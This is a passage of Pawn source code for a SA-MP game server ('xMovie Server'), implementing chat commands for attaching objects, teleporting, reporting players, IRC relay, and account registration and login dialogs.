	    if (copymode == 1) // osticks
	    {
			for (new i = 0; i < VIP_MAX_OSTICKS; i++)
			{
			    if (pSObject[playerid][i][so_model] != -1)
			    {
	    	        if (pSObject[playerid][i][so_object] != -1)
					DestroyObject(pSObject[playerid][i][so_object]);

					pSObject[playerid][i][so_object] 	= -1;
					pSObject[playerid][i][so_model] 	= -1;
					pSObject[playerid][i][so_x]         = 0.0;
					pSObject[playerid][i][so_y]         = 0.0;
					pSObject[playerid][i][so_z]         = 0.0;
					pSObject[playerid][i][so_rx]        = 0.0;
					pSObject[playerid][i][so_ry]        = 0.0;
					pSObject[playerid][i][so_rz]        = 0.0;
				}
			}
			player[playerid][ostickc] = 0;
			
			for (new i = 0; i < VIP_MAX_OSTICKS; i++)
			{
			    if (pSObject[giveplayerid][i][so_model] != -1)
			    {
					pSObject[playerid][i][so_model]			= pSObject[giveplayerid][i][so_model];
					pSObject[playerid][i][so_isvehicle]		= pSObject[giveplayerid][i][so_isvehicle];
					pSObject[playerid][i][so_vehiclemodel]	= pSObject[giveplayerid][i][so_vehiclemodel];
					pSObject[playerid][i][so_x]         	= pSObject[giveplayerid][i][so_x];
					pSObject[playerid][i][so_y]         	= pSObject[giveplayerid][i][so_y];
					pSObject[playerid][i][so_z]         	= pSObject[giveplayerid][i][so_z];
					pSObject[playerid][i][so_rx]        	= pSObject[giveplayerid][i][so_rx];
					pSObject[playerid][i][so_ry]        	= pSObject[giveplayerid][i][so_ry];
					pSObject[playerid][i][so_rz]        	= pSObject[giveplayerid][i][so_rz];

					pSObject[playerid][i][so_object] = CreateObject(pSObject[playerid][i][so_model], 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
					if (pSObject[playerid][i][so_isvehicle] == 0)
					{
						AttachObjectToPlayer(pSObject[playerid][i][so_object], playerid, pSObject[playerid][i][so_x], pSObject[playerid][i][so_y], pSObject[playerid][i][so_z], pSObject[playerid][i][so_rx], pSObject[playerid][i][so_ry], pSObject[playerid][i][so_rz]);
					} else {
						if (GetPlayerState(playerid) == PLAYER_STATE_DRIVER && pSObject[playerid][i][so_vehiclemodel] == GetVehicleModel(vID))
						AttachObjectToVehicle(pSObject[playerid][i][so_object], vID, pSObject[playerid][i][so_x], pSObject[playerid][i][so_y], pSObject[playerid][i][so_z], pSObject[playerid][i][so_rx], pSObject[playerid][i][so_ry], pSObject[playerid][i][so_rz]);
					}
					player[playerid][ostickc]++;
				}
			}
			player[playerid][ostickc] = 0;
	    } else { // posticks
			for (new i = 0; i < VIP_MAX_POSTICKS; i++)
			{
			    if (pAObject[playerid][i][ao_model] != -1)
			    {
				    RemovePlayerAttachedObject(playerid, i);
					pAObject[playerid][i][ao_model]	= -1;
					pAObject[playerid][i][ao_bone]	= 0;
					pAObject[playerid][i][ao_x]		= 0.0;
					pAObject[playerid][i][ao_y]		= 0.0;
					pAObject[playerid][i][ao_z]		= 0.0;
					pAObject[playerid][i][ao_rx]	= 0.0;
					pAObject[playerid][i][ao_ry]	= 0.0;
					pAObject[playerid][i][ao_rz]	= 0.0;
					pAObject[playerid][i][ao_sx]	= 1.0;
					pAObject[playerid][i][ao_sy]	= 1.0;
					pAObject[playerid][i][ao_sz]	= 1.0;
				}
			}
			player[playerid][postickc] = 0;
			
			for (new i = 0; i < VIP_MAX_POSTICKS; i++)
			{
			    if (pAObject[giveplayerid][i][ao_model] != -1)
			    {
					pAObject[playerid][i][ao_model]	= pAObject[giveplayerid][i][ao_model];
					pAObject[playerid][i][ao_bone]	= pAObject[giveplayerid][i][ao_bone];
					pAObject[playerid][i][ao_x]		= pAObject[giveplayerid][i][ao_x];
					pAObject[playerid][i][ao_y]		= pAObject[giveplayerid][i][ao_y];
					pAObject[playerid][i][ao_z]		= pAObject[giveplayerid][i][ao_z];
					pAObject[playerid][i][ao_rx]	= pAObject[giveplayerid][i][ao_rx];
					pAObject[playerid][i][ao_ry]	= pAObject[giveplayerid][i][ao_ry];
					pAObject[playerid][i][ao_rz]	= pAObject[giveplayerid][i][ao_rz];
					pAObject[playerid][i][ao_sx]	= pAObject[giveplayerid][i][ao_sx];
					pAObject[playerid][i][ao_sy]	= pAObject[giveplayerid][i][ao_sy];
					pAObject[playerid][i][ao_sz]	= pAObject[giveplayerid][i][ao_sz];
					
    				SetPlayerAttachedObject(playerid, i, pAObject[playerid][i][ao_model], pAObject[playerid][i][ao_bone], pAObject[playerid][i][ao_x], pAObject[playerid][i][ao_y], pAObject[playerid][i][ao_z], pAObject[playerid][i][ao_rx], pAObject[playerid][i][ao_ry], pAObject[playerid][i][ao_rz], pAObject[playerid][i][ao_sx], pAObject[playerid][i][ao_sy], pAObject[playerid][i][ao_sz]);
    				
					player[playerid][postickc]++;
				}
			}
	    }
		SendCommandMessageToAdmins(playerid, "copystick");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_setgreet(playerid,params[])
{
	new greetStr[100];
	if (sscanf(params, "s[100]", greetStr))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setgreet <greeting message/off> [Max 100 characters, colour tags allowed, for example: -RED | DOES NOT SHOW WHEN /HIDE IS ON!]");

	new mysqlStr[206];
	if (!strcmp(greetStr, "off", true))
	{
		format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PREFERENCES" SET `preference_greeting` = '' WHERE account_id = %d LIMIT 1", GetPlayerAccountID(playerid));
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
		
		SendServerMessage(playerid, EMBED_WHITE, "Your greet message has been disabled.");
	} else {
		mysql_real_escape_string(greetStr, greetStr);
		format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PREFERENCES" SET `preference_greeting` = '%s' WHERE account_id = %d LIMIT 1", greetStr, GetPlayerAccountID(playerid));
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
		
		SendServerMessage(playerid, EMBED_IVORY, "Your greet message has been set to:");
		SendServerMessage(playerid, EMBED_WHITE, ColouredText(greetStr));
	}

	SendCommandMessageToAdmins(playerid, "setgreet");
	return 1;
}

dcmd_reverse(playerid,params[])
return dcmd_rev(playerid,params);

dcmd_rev(playerid,params[])
{
	#pragma unused params

 	if (!IsPlayerDriver(playerid) && !IsPlayerAdminLevel(playerid, 4))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

    if (!IsPlayerAdminLevel(playerid, 3))
    {
		if (!AntiSpam(playerid, 2)) return 1;
	}

	new vID = GetPlayerVehicleID(playerid),
		Float:iX,
		Float:iY,
		Float:iZ,
		Float:iA;

	if (!vID)
	{
		GetPlayerVelocity(playerid, iX, iY, iZ);
		GetPlayerFacingAngle(playerid, iA);
		SetPlayerFacingAngle(playerid, iA+180);
		SetPlayerVelocity(playerid, -iX, -iY, -iZ);
	} else {
		GetVehicleVelocity(vID, iX, iY, iZ);
		GetVehicleZAngle(vID, iA);
		SetVehicleZAngle(vID, iA+180);
		SetVehicleVelocity(vID, -iX, -iY, -iZ);
	}
	
 	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "[A-1] "EMBED_IVORY"%s has used /reverse", playername);

	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	    if (IsPlayerConnected(a) && player[a][ADMIN] > 0 && player[a][adminmsgs] == 1)
		SendClientMessage(a, COLOR_RED, strings);
	}
	format(logstring, sizeof(logstring), "[A-1] %s has used /reverse", playername);
	printflog("ADM-MSG", logstring);
	return 1;
}

dcmd_irc(playerid,params[])
{
	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

	if (!strlen(params))
	return 1;

	if (!IsAdmin(playerid))
	SpamProtection(playerid, "/irc");

	GetPlayerName(playerid, playername, sizeof(playername));
	format(ircstring, sizeof(ircstring), "10[SAMP2IRC] %s (%d):1 %s", playername, playerid, params);
	//format(ircstring, sizeof(ircstring), "10IRC Message from %s (%d):1 %s", playername, playerid, params);
	IRC_GroupSay(1, IRC_CHANNEL, ircstring);
   	printflog("IRC", ircstring);
	return 1;
}

dcmd_report(playerid,params[])
{
	if (IsPlayerAdminLevel(playerid, 3))
	return SendErrorMessage(playerid, EMBED_WHITE, "Admins who can kick cannot report");

	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

	new idx;

	strings = strtok(params, idx);
	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /report <player + reason>");

	if (!AntiSpam(playerid, 5)) return 1;

	if (!IsNumeric(strings)) giveplayerid = ReturnPlayerID(strings);
	else giveplayerid = strval(strings);

	GetPlayerName(playerid, playername, sizeof(playername));
 	GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		format(logstring, sizeof(logstring), "[SUCCESS] Report sent to admins: \"%s (%d) for %s\"", giveplayername, giveplayerid, params[strlen(strings)+1]);
		SendClientMessage(playerid, COLOR_IVORY, logstring);

		format(logstring, sizeof(logstring), "%s (%d) reported: %s (%d) for %s", playername, playerid, giveplayername, giveplayerid, params[strlen(strings)+1]);
	} else {
		format(logstring, sizeof(logstring), "[SUCCESS] Report sent to admins: \"%s (%d): %s\"", playername, playerid, params);
		SendClientMessage(playerid, COLOR_IVORY, logstring);

		format(logstring, sizeof(logstring), "%s (%d) reported: %s", playername, playerid, params);
	}
	SendServerMessageToAdmins(EMBED_ORANGERED, logstring, 1);
	printflog("REPORT", logstring);
	format(tmps2, sizeof(tmps2), "5,15%s", logstring);
	IRC_GroupSay(1, IRCOP_CHANNEL, tmps2);
	return 1;
}

dcmd_ramps(playerid,params[])
{
	#pragma unused params

	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

	SpamProtection(playerid, "/ramps cmd");

	GetPlayerName(playerid, playername, sizeof(playername));
	if (player[playerid][ramps] == 0)
	{
	    player[playerid][ramps] = 1;
    	format(strings, sizeof(strings), "%s has "EMBED_GREEN"ENABLED"EMBED_WHITE" ramps.", playername);
	} else {
	    player[playerid][ramps] = 0;
    	format(strings, sizeof(strings), "%s has "EMBED_RED"DISABLED"EMBED_WHITE" ramps.", playername);
	}
	SendServerMessageToAll(EMBED_WHITE, strings);
	return 1;
}

dcmd_antifall(playerid,params[])
return dcmd_af(playerid,params);

dcmd_af(playerid,params[])
{
	#pragma unused params

	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

	SpamProtection(playerid, "/antifall cmd");

	GetPlayerName(playerid, playername, sizeof(playername));
	if (player[playerid][antifall] == 0)
	{
	    new vID = GetPlayerVehicleID(playerid);
		if (vID && IsPlayerDriver(playerid))
		{
			player[playerid][antifallvid] = vID;
			player[playerid][antifallsid] = GetPlayerVehicleSeat(playerid);
		}

	    player[playerid][antifall] = 1;
    	format(strings, sizeof(strings), "%s has "EMBED_GREEN"ENABLED"EMBED_WHITE" antifall.", playername);
	} else {
	    player[playerid][antifall] = 0;
    	format(strings, sizeof(strings), "%s has "EMBED_RED"DISABLED"EMBED_WHITE" antifall.", playername);
	}
	SendServerMessageToAll(EMBED_WHITE, strings);
	return 1;
}

dcmd_turngoto(playerid,params[])
{
	#pragma unused params

	if (player[playerid][gotomode] == 1)
	{
	    player[playerid][gotomode] = 0;
	    SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Goto disabled");
	} else {
	    player[playerid][gotomode] = 1;
 	    SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Goto enabled");
	}
	return 1;
}

dcmd_register(playerid,params[])
{
	#pragma unused params

    if (player[playerid][logged] == 1 || player[playerid][clogged] == 1)
	return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "You are already logged in.", "Close", "");

	if (IsPlayerRegistered(playerid))
	return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "This account is already registered.", "Close", "");

	//if (player[playerid][playtime]/60 < 30)
	//return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Registering a Secured Account is only available after 30 minutes playtime.", "Close", "");

	ShowPlayerDialog(playerid, DIALOGID_REGISTER, DIALOG_STYLE_INPUT, "xMovie Server", "Step 1 of 2.\n\nPlease set a password for your account below:\n[Password length must be between 5-30 characters]\n\n"EMBED_IVORY"*All passwords are encrypted using a hash algorithm and is not viewable by ANYONE.", "Set", "Cancel");

    /*if (IsPlayerRegistered(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "This account is already registered.");

	if (player[playerid][playtime]/60 < 30)
	return SendErrorMessage(playerid, EMBED_WHITE, "Registering a Secured Account is only available after 30 minutes playtime.");

	new idx;

	tmps1 = strtok(params,idx);
    if (!strlen(tmps1) || strlen(tmps1) < 5 || strlen(tmps1) > 30)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /register [password]   (minimum 5 characters)");

    new password[129];

    WP_Hash(password, sizeof(password), tmps1);
	CreatePlayerAccount(playerid, tmps1, password);
	
	//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_accounts_registered) VALUES (CURDATE(), 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_accounts_registered` = server_statistic_accounts_registered +1", false, "", "");*/
	return 1;
}

dcmd_login(playerid,params[])
{
	#pragma unused params
	
	GetPlayerName(playerid, playername, sizeof(playername));
	format(sMsg, sizeof(sMsg), "{00FFFF}Welcome to the xMovie Server, Mr %s. "EMBED_RED"This account is secured, please login!\n\n"EMBED_LIME"Website: www.xmovieserver.com (new website soon!)\n\n"EMBED_WHITE"Latest news:"EMBED_GREY"\n%s", playername, servermessage);
	strcat(sMsg, "\n\nIRC Server: irc.gtanet.com\nIRC Channel: #xmovie\n\n\n{FFFF00}This server is brought to you by MrPepino, spacemud, [FRAG]B and ofcourse all the donators!\nAlso big thanks to Commissioner, zorro628, spacemud and [FRAG]B for categorizing a bunch of stuff.\n\np.s. spacemud likes horses");
    ShowPlayerDialog(playerid, DIALOGID_LOGIN, DIALOG_STYLE_PASSWORD, "xMovie Server", sMsg, "Login", "");
	return 1;
}

dcmd_setpass(playerid,params[])
{
	#pragma unused params

	ShowPlayerDialog(playerid, DIALOGID_SETPASS, DIALOG_STYLE_INPUT, "xMovie Server", "Please set a password for your account below:\n[Password length must be between 5-30 characters]", "Set", "");
	return 1;
}

dcmd_setmail(playerid,params[])
{
	#pragma unused params

	ShowPlayerDialog(playerid, DIALOGID_SETMAIL, DIALOG_STYLE_INPUT, "xMovie Server", "If you would like to receive:\n- news;\n- updates;\n- ability to retrieve lost password.\nplease enter your email adress below.\n\nIf you do not wish to receive any, skip this step.\n\n"EMBED_IVORY"*We do NOT distribute personal info to third parties.", "Set", "Cancel");
	return 1;
}

dcmd_setemail(playerid,params[])
{
	#pragma unused params

	ShowPlayerDialog(playerid, DIALOGID_SETMAIL, DIALOG_STYLE_INPUT, "xMovie Server", "If you would like to receive:\n- news;\n- updates;\n- ability to retrieve lost password.\nplease enter your email adress below.\n\nIf you do not wish to receive any, skip this step.\n\n"EMBED_IVORY"*We do NOT distribute personal info to third parties.", "Set", "Cancel");
	return 1;
}

dcmd_clogin(playerid,params[])
{
    if (IsPlayerLoggedIn(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You are already logged in.");

	new idx;

	tmps2 = strtok(params,idx);
    if (strlen(tmps2) < 5 || strlen(tmps2) > 20)
	return SendErrorMessage(playerid, EMBED_WHITE, "You have tried a non-existing command, type /help to view server commands.");

	tmps1 = strtok(params,idx);
    if (strlen(tmps1) < 5 || strlen(tmps1) > 30)
	return SendErrorMessage(playerid, EMBED_WHITE, "You have tried a non-existing command, type /help to view server commands.");

    new password[129],
		mysqlStr[92];

    WP_Hash(password, sizeof(password), tmps1);
	mysql_real_escape_string(tmps2, tmps2);
 	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_ACCOUNTS" WHERE `account_name` = '%s' LIMIT 1", tmps2);
	mysql_run_query(mysqlConnection, mysqlStr, true, "QS_GhostPlayerAccount", "iis", playerid, player[playerid][cinc], password);
	return 1;
}

dcmd_clogout(playerid,params[])
{
	#pragma unused params

    if (player[playerid][clogged] == 0)
	return 1;

	GetPlayerName(playerid, playername, sizeof(playername));
	if (IsAdmin(playerid))
	{
		SendServerMessage(playerid, EMBED_WHITE , "You have succesfully logged out as an ADMIN.");
		format(logstring, sizeof(logstring), "%s (id: %d) (level: %d) has logged out as admin clone.", playername, playerid, GetPlayerAdminLevel(playerid));
		SendServerMessageToAdmins(EMBED_BROWN, logstring, GetPlayerAdminLevel(playerid));
		printflog("LOGOUT-C", logstring);
		format(ircstring, sizeof(ircstring), "7,6 %s", logstring);
		IRC_GroupSay(1, IRCSOP_CHANNEL, ircstring);
	} else {
		SendServerMessage(playerid, EMBED_WHITE, "You have succesfully logged out as a VIP.");
		format(logstring, sizeof(logstring), "%s (id: %d) has logged out as VIP clone.", playername, playerid);
		SendServerMessageToAdmins(EMBED_BROWN, logstring, GetPlayerAdminLevel(playerid));
		printflog("LOGOUT-C", logstring);
		format(ircstring, sizeof(ircstring), "7,6 %s", logstring);
		IRC_GroupSay(1, IRCSOP_CHANNEL, ircstring);
	}
	SendCommandMessageToAdmins(playerid, "clogout", player[playerid][ADMIN]);
	
	player[playerid][logged] = 0;
	player[playerid][clogged] = 0;
	player[playerid][accountid] = 0;
	player[playerid][VIP] = 0;
	player[playerid][ADMIN] = 0;
	player[playerid][hideadmin] = 0;
	player[playerid][adminmsgs] = 0;
	return 1;
}

dcmd_goto(playerid, params[]) // Simon
{
	new idx,
		Float:X,
	 	Float:Y,
	 	Float:Z,
	 	Float:A,
		Interior;

	if (IsVIP(playerid)) goto fgoto;

	if (player[playerid][frozen] == 1)
 	return SendErrorMessage(playerid, EMBED_WHITE, "Cannot use /goto while frozen");

	if (gotos == false)
	return SendErrorMessage(playerid, EMBED_WHITE, "Teleporting has been disabled by an admin");

	if (!AntiSpam(playerid, 5)) return 1;

	fgoto:
	strings = strtok(params, idx);
	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /goto <name|id> (X_OFFSET Y_OFFSET Z_OFFSET)");

	if (!IsNumeric(strings)) giveplayerid = ReturnPlayerID(strings);
	else giveplayerid = strval(strings);

	if (!IsPlayerConnected(giveplayerid) || giveplayerid == INVALID_PLAYER_ID)
	return SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");

	if (!IsPlayerSpawned(giveplayerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

	if (player[giveplayerid][playingdm] == 1 || player[giveplayerid][playingderby] == 1 || player[giveplayerid][playingrr] == 1 || player[giveplayerid][playingcc] == 1 || player[giveplayerid][playingnb] == 1 || player[giveplayerid][playingwarzone] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "This player is currently in a deathmatch.");

	if (player[giveplayerid][specdm] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "This player is currently spectating a dm");

	if (player[giveplayerid][Spectating] == 1)
	{
		if (!IsAdmin(playerid) && IsAdmin(giveplayerid)) return 1;
		else return SendErrorMessage(playerid, EMBED_WHITE, "This player is currently spectating");
	}

	if (player[playerid][afk] > 0)
	return SendErrorMessage(playerid, EMBED_WHITE, "This player is currently AFK.");

	if (giveplayerid == playerid) goto next;
	if (player[giveplayerid][gotomode] == 0)
	{
		if (IsPlayerAdminLevel(playerid, 3))
		{
		    if (player[playerid][ADMIN] < player[giveplayerid][ADMIN]) return SendErrorMessage(playerid, EMBED_WHITE, "This player does not allow teleporting to him/her.");
		    else {
				SendClientMessage(playerid, COLOR_WHITE, "[INFO]: This player has goto off");
				SendCommandMessageToAdmins(playerid, "goto");
				goto next;
			}
		} else return SendErrorMessage(playerid, EMBED_WHITE, "This player does not allow teleporting to him/her.");
	}
	next:

	GetPlayerPos(giveplayerid, X, Y, Z);
	GetPlayerFacingAngle(giveplayerid, A);
	Interior = GetPlayerInterior(giveplayerid);
	strings = strtok(params, idx);
	if (!strlen(strings))
	{
	    GetXYInFrontOfPlayer(giveplayerid, X, Y, 1.5);
	    SetPlayerPosEx(playerid, X, Y, Z, A, Interior);

	    GetPlayerName(giveplayerid, tmps2, sizeof(tmps2));
		format(strings, sizeof(strings), "[SUCCESS]: You have teleported to %s (ID: %d).", tmps2, giveplayerid);
		SendClientMessage(playerid, COLOR_IVORY, strings);

		if (IsPlayerAdminLevel(playerid, 3))
		{
	    	if (playerid != giveplayerid && player[giveplayerid][gotomode] == 0)
			return 1;
		}

		GetPlayerName(playerid, tmps2, sizeof(tmps2));
		format(strings, sizeof(strings), "%s (ID: %d) has teleported to you.", tmps2, playerid);
		SendClientMessage(giveplayerid, COLOR_IVORY, strings);
	    return 1;
	}

	X += floatstr(strings);
	strings = strtok(params, idx);

	if (!strlen(strings)) {
	    goto fwarpto;
	}

	Y += floatstr(strings);
	strings = strtok(params, idx);

	if (!strlen(strings)) {
	    goto fwarpto;
	}

	Z += floatstr(strings);

	fwarpto:

	SetPlayerPosEx(playerid, X, Y, Z, A, Interior);

	GetPlayerName(giveplayerid, tmps2, sizeof(tmps2));
	format(strings, sizeof(strings), "[SUCCESS]: You have teleported to %s (ID: %d).", tmps2, giveplayerid);
	SendClientMessage(playerid, COLOR_IVORY, strings);

	if (IsPlayerAdminLevel(playerid, 3))
	{
	   	if (playerid != giveplayerid && player[giveplayerid][gotomode] == 0)
		return 1;
	}

	GetPlayerName(playerid, tmps2, sizeof(tmps2));
	format(strings, sizeof(strings), "%s (ID: %d) has teleported to you.", tmps2, playerid);
	SendClientMessage(giveplayerid, COLOR_IVORY, strings);
	return 1;
}

dcmd_ostick(playerid,params[])
{
 	if (IsPlayerInAnyVehicle(playerid) && !IsPlayerDriver(playerid) && !IsPlayerAdminLevel(playerid, 4))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	new idx,
		modelid2,
		Float:X = 0.0,
	 	Float:Y = 0.0,
	 	Float:Z = 0.0,
	 	Float:rX = 0.0,
	 	Float:rY = 0.0,
	 	Float:rZ = 0.0;

	strings = strtok(params, idx);
	if (!strlen(strings) || !IsNumeric(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /ostick <objectid> (<OFFSET_x y z) (ROTATION rx ry rz>) [Premium users: max. 8 objects]");
	modelid2 = strval(strings);

	if (!IsValidModel(modelid2) || modelid2 == 362)
	return SendErrorMessage(playerid, EMBED_WHITE, "The model ID you supplied doesn't seem to be valid!");

	if (IsVIP(playerid))
	{
		if (player[playerid][ostickc] >= VIP_MAX_OSTICKS)
		return SendErrorMessage(playerid, EMBED_WHITE, "You have reached the ostick limit (max. 4), type /ounstick <1-4> to remove. [Premium users: max. 8 objects]");
	} else {
		if (player[playerid][ostickc] >= DEFAULT_MAX_OSTICKS)
		return SendErrorMessage(playerid, EMBED_WHITE, "You have reached the ostick limit (max. 4), type /ounstick <1-4> to remove. [Premium users: max. 8 objects]");
	}
	player[playerid][ostickc]++;

	strings = strtok(params, idx);
	if (strlen(strings) && IsNumeric(strings))
	X = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) && IsNumeric(strings))
	Y = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) && IsNumeric(strings))
	Z = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) && IsNumeric(strings))
	rX = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) && IsNumeric(strings))
	rY = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) && IsNumeric(strings))
	rZ = floatstr(strings);

	for (new e = 0; e < VIP_MAX_OSTICKS; e++)
	{
		if (pSObject[playerid][e][so_model] == -1)
		{
			pSObject[playerid][e][so_object]	= CreateObject(modelid2, 0, 0, 0, 0, 0, 0);
			pSObject[playerid][e][so_model]		= modelid2;
			pSObject[playerid][e][so_x]         = X;
			pSObject[playerid][e][so_y]         = Y;
			pSObject[playerid][e][so_z]         = Z;
			pSObject[playerid][e][so_rx]        = rX;
			pSObject[playerid][e][so_ry]        = rY;
			pSObject[playerid][e][so_rz]        = rZ;
			
			new vID = GetPlayerVehicleID(playerid);
			if (!vID)
			{
				AttachObjectToPlayer(pSObject[playerid][e][so_object], playerid, X, Y, Z, rX, rY, rZ);
				pSObject[playerid][e][so_isvehicle] = 0;
				pSObject[playerid][e][so_vehiclemodel] = 0;
			} else {
				AttachObjectToVehicle(pSObject[playerid][e][so_object], vID, X, Y, Z, rX, rY, rZ);
				pSObject[playerid][e][so_isvehicle] = vID;
				pSObject[playerid][e][so_vehiclemodel] = GetVehicleModel(vID);
			}
			break;
		}
 	}

	if (IsVIP(playerid)) format(strings, sizeof(strings), "Status: Added %d -> #1: %d #2: %d #3: %d #4: %d #5: %d #6: %d #7: %d #8: %d", modelid2, pSObject[playerid][0][so_model], pSObject[playerid][1][so_model], pSObject[playerid][2][so_model], pSObject[playerid][3][so_model], pSObject[playerid][4][so_model], pSObject[playerid][5][so_model], pSObject[playerid][6][so_model], pSObject[playerid][7][so_model]);
	else format(strings, sizeof(strings), "Status: Added %d -> #1: %d #2: %d #3: %d #4: %d", modelid2, pSObject[playerid][0][so_model], pSObject[playerid][1][so_model], pSObject[playerid][2][so_model], pSObject[playerid][3][so_model]);
	SendClientMessage(playerid, COLOR_YELLOW, strings);
	return 1;
}

dcmd_osetstick(playerid,params[])
{
    new idx,
		soid,
		Float:X,
	 	Float:Y,
	 	Float:Z,
	 	Float:rX,
	 	Float:rY,
	 	Float:rZ;

	strings = strtok(params, idx);
	soid = strval(strings);
	if (strlen(strings) && IsNumeric(strings) && soid > 0)
	{
		if (IsVIP(playerid))
		{
			if (soid > VIP_MAX_OSTICKS)
			return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /osetstick <1-4> <OFFSET_x y z (ROTATION rx ry rz)> [Premium users: max. 8 objects]");
		} else {
			if (soid > DEFAULT_MAX_OSTICKS)
			return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /osetstick <1-4> <OFFSET_x y z (ROTATION rx ry rz)> [Premium users: max. 8 objects]");
		}
		soid -= 1;
	} else return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /osetstick <1-4> <OFFSET_x y z (ROTATION rx ry rz)> [Premium users: max. 8 objects]");
	
	if (pSObject[playerid][soid][so_model] == -1)
	return SendErrorMessage(playerid, EMBED_WHITE, "there is no object in this slot!");

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	X = floatstr(strings);
	else return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /osetstick <1-4> <OFFSET_x y z (ROTATION rx ry rz)> [Premium users: max. 8 objects]");

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	Y = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	Z = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	rX = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	rY = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	rZ = floatstr(strings);

	DestroyObject(pSObject[playerid][soid][so_object]);
	pSObject[playerid][soid][so_object] = CreateObject(pSObject[playerid][soid][so_model], 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
	new vID = GetPlayerVehicleID(playerid);
	if (!vID)
	{
		AttachObjectToPlayer(pSObject[playerid][soid][so_object], playerid, X, Y, Z, rX, rY, rZ);
		pSObject[playerid][soid][so_isvehicle] = 0;
		pSObject[playerid][soid][so_vehiclemodel] = 0;
	} else {
		AttachObjectToVehicle(pSObject[playerid][soid][so_object], vID, X, Y, Z, rX, rY, rZ);
		pSObject[playerid][soid][so_isvehicle] = vID;
		pSObject[playerid][soid][so_vehiclemodel] = GetVehicleModel(vID);
	}
	
	pSObject[playerid][soid][so_x]     	= X;
	pSObject[playerid][soid][so_y]      = Y;
	pSObject[playerid][soid][so_z]      = Z;
	pSObject[playerid][soid][so_rx]     = rX;
	pSObject[playerid][soid][so_ry]     = rY;
	pSObject[playerid][soid][so_rz]     = rZ;
	
	if (IsVIP(playerid)) format(strings, sizeof(strings), "Status: Set %d -> #1: %d #2: %d #3: %d #4: %d #5: %d #6: %d #7: %d #8: %d", soid+1, pSObject[playerid][0][so_model], pSObject[playerid][1][so_model], pSObject[playerid][2][so_model], pSObject[playerid][3][so_model], pSObject[playerid][4][so_model], pSObject[playerid][5][so_model], pSObject[playerid][6][so_model], pSObject[playerid][7][so_model]);
	else format(strings, sizeof(strings), "Status: Set %d -> #1: %d #2: %d #3: %d #4: %d", soid+1, pSObject[playerid][0][so_model], pSObject[playerid][1][so_model], pSObject[playerid][2][so_model], pSObject[playerid][3][so_model]);
	SendClientMessage(playerid, COLOR_YELLOW, strings);
	return 1;
}

dcmd_oreplace(playerid,params[])
{
    new idx,
		soid,
		modelid2;

	strings = strtok(params, idx);
	soid = strval(strings);
	if (strlen(strings) && IsNumeric(strings) && soid > 0)
	{
		if (IsVIP(playerid))
		{
			if (soid > VIP_MAX_OSTICKS)
			return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /oreplace <1-4> <objectid> [Premium users: max. 8 objects]");
		} else {
			if (soid > DEFAULT_MAX_OSTICKS)
